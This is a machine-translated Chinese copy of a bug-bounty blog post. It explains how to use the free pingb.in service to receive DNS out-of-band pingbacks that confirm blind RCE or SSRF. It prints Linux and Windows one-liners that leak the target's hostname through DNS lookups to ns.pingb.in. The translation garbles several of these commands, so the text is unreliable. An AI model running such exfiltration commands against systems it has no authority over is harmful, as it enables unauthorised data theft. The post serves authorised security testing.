<html>
<head>
<title>A Simple DNS OOB exfil solution, or pingb.in (life)hack</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">一个简单的DNS OOB出口解决方案，或pingb.in (life)hack</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/a-simple-dns-oob-exfil-solution-or-pingb-in-life-hack-45e6aa44fc49?source=collection_archive---------3-----------------------#2020-06-28">https://infosecwriteups.com/a-simple-dns-oob-exfil-solution-or-pingb-in-life-hack-45e6aa44fc49?source=collection_archive---------3-----------------------#2020-06-28</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/5987c04022b157c4b4a6928e53701266.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MS0m00f2gUVB4DQluy00Kg.png"/></div></div></figure><p id="2001" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">有时候你想从生活中得到更多的东西，我不能帮你，但有时候你想从寻找臭虫中得到更多的东西，比如P1臭虫，RCE-s和SSRF-s往往属于这种类型。我不能帮你找到那些P1错误，但是希望这篇文章能帮助你在面临某些限制时利用它们。</p><p id="4717" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">DNS OOB出口是一个严重的错误猎人的武器库的重要组成部分。但是这种类型的外发连接旁路需要您设置一种方式来接收对您所拥有的服务器的DNS查询，您可以在那里记录传入的流量以供以后查看(指的是burp collaborator的唯一缺点，它可以在随机时间退出，或者您的计算机可能会崩溃，ISP问题等。).虽然有一个免费的域名提供商，但我发现所有的教程都要求你使用付费的(据我所知，我很努力地寻找，甚至替代解决方案也让我头疼)，而且你已经在为你的vps服务器付费了，不管你有什么其他的“常规”账单，那么如果你不想为另一件事付费，该怎么办呢？嗯，我实际上找到了这个解决方案后，克制自己打破了我的键盘沮丧，我不能让免费域名提供商的DNS配置工作，根据我的理解，上述教程中的付费DNS配置被用来代替。另外，像bind9这样的选择也让我失望了，或者说我让他们失望了。不管怎样，都有解决的办法。</p><p id="6141" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">这种简单的解决方案基本上不需要任何配置，因此真正实现了零挫折。是的，你没看错，没有配置，甚至没有网络知识(虽然这将是有帮助的，只是一般来说)，它可以通过以下链接获得:</p><p id="da7e" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><a class="ae kz" href="http://pingb.in/" rel="noopener ugc nofollow" target="_blank"> http://pingb.in </a></p><p id="9196" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">访问该网站时，您的地址栏中会出现以下内容:</p><p id="99a2" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">【http://pingb.in/randomstring T2】号</p><p id="5c11" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">现在，在页面上您会看到各种选项。如您所见，乍一看，DNS数据导出存在一些限制:</p><p id="f3c3" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">失败的示例:</p><p id="238f" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">如果你这样做:</p><p id="c8c1" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"># ping“uname”。</p><p id="3224" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">你什么也得不到，没有任何形式的回应。</p><p id="e537" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">成功范例:</p><p id="61b8" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">但是以上面的例子为例，输入以下内容:</p><p id="f2fd" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"># ping randomstring</p><p id="1a28" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">现在，您可以在输出中看到(尽管有错误，并且源ip是目标使用的DNS解析器):</p><figure class="lb lc ld le gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi la"><img src="../Images/59c8fe1158d72eaff7bf21f567b43589.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*58VxJNAD7u08yqybeQKKwA.png"/></div></div></figure><p id="ec99" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当然，对于其他数据导出，可以尝试这样做(分别从linux和windows cmd提示符下)</p><p id="f0da" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"># ping randomstring . ` hostname ` . ns . ping b . in</p><p id="f0d0" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">c:\ &gt; cmd/v/c " hostname &gt; temp &amp; &amp; set/p MYVAR = &lt; temp &amp; &amp; set FINAL = ae0f 8858 ee 70 fbfff 1d 8 B3 E1 d 90 a。！MYVAR！. ns.pingb.in &amp;&amp; ping！决赛！”</p><p id="36ed" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">并检查<a class="ae kz" href="http://pingb.in/random-string-that-you-used" rel="noopener ugc nofollow" target="_blank">http://pingb.in/random-string-that-you-used</a>并查看输出。</p><figure class="lb lc ld le gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi lf"><img src="../Images/b53f87b5b5ff6b254e2790011d53bb23.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Q6o1BiBgXh5ny8523_7s_w.png"/></div></div></figure><p id="ea81" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">给你。它是免费的，不需要任何设置，它使用ping，默认情况下任何操作系统都可以使用，如果你的电脑崩溃了，你可以访问:【http://pingb.in/random-string-that-you-used】T2，你仍然可以等待pingbacks。它似乎会持续很长时间，但是如果有太多的pingbacks，当你刷新页面时，它可能会将所有内容都删除。要记住的是，你应该密切关注它，并在计算机崩溃后立即打开页面，以避免潜在的遗漏pingbacks。</p><p id="af6a" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">额外的想法或我希望我在RCE自动测试一个非常大的子域列表时考虑的:当你想知道pingback的来源时:</p><p id="3d0b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">ping randomstring . target-subdomain . target . com . ns . pingb in</p></div></div>    
</body>
</html>